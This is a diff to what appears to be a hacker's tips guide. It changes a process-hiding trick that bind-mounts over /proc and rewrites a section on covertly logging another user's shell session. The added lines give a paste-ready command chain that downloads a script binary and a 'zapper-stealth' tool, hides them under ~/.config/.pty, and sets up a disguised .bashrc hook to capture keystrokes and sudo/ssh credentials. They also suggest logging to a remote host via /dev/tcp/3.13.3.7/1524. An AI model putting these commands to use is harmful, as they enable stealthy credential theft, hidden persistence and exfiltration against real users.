@@ -231,8 +231,7 @@ echo 'ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >>~/.ba
 
 This requires root privileges and is an old Linux trick by over-mounting /proc/&lt;pid&gt; with a useless directory:
 ```sh
-hide()
-{
+hide() {
     [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
     _pid=${1:-$$}
     [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo "[THC] PID $_pid is now hidden"; return; }
@@ -1889,13 +1888,23 @@ openssl enc -d -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt.enc >input.
 <a id="ssh-sniffing-script"></a>
 **10.i Sniff a user's SHELL session with script**
 
-A method to log the shell session of a user (who logged in via SSH).
+A method to log the shell session of a user. Useful when you are not root but still like to capture the sudo/ssh credentials of the user. Records the user's keystrokes to `~/.config/.pty/.@*`.
 
-The tool 'script' has been part of Unix for decades. Add 'script' to the user's .profile. The user's keystrokes and session will be recorded to ~/.ssh-log.txt the next time the user logs in:
+Cut & paste the following and follow the instructions:
 ```sh
-echo 'exec script -qc /bin/bash ~/.ssh-log.txt' >>~/.profile
+{ mkdir -p ~/.config/.pty 2>/dev/null; [ $(uname -m) == aarch64 ] && s=aarch64_arm64; :; } \
+&& curl -o ~/.config/.pty/sshd@pty0 -fsSL "https://bin.ajam.dev/${s:-x896_64}_Linux/Baseutils/script" \
+&& chmod 755 ~/.config/.pty/sshd@pty0 \
+&& curl -o ~/.config/.pty/clear -fsSL https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-stealth-linux-$(uname -m) \
+&& chmod 755 ~/.config/.pty/clear \
+&& echo 'SUCCESS. Add this to the ~/.bashrc:' \
+&& echo -e '\e[0;35m[ -z "$LC_PTY" ] && [ -t0 ] && [[ "$HISTFILE" != *null* ]] && [ -e .config/.pty/clear ] && [ -e .config/.pty/sshd@pty0 ] && LC_PTY=1 exec .config/.pty/clear ".config/.pty/sshd@pty0" -qaec "exec -a -bash /bin/bash" -I ".config/.pty/.@pty-unix.$$"\e[0m]'
 ```
-Consider using [zap-args](#bash-hide-arguments) to hide the the arguments and /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.
+
+- Combined with zapper to hide command options from the process list.
+- Requires util-linux >= 2.37 (-I flag). We pull the static bin from [ajam](https://bin.ajam.dev). 
+- Consider using /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.
+- Log in with `ssh -o "SetEnv LC_PTY=1"` to disable logging.
 
 <a id="dtrace"></a>
 **10.ii Sniff all SHELL sessions with dtrace - FreeBSD**
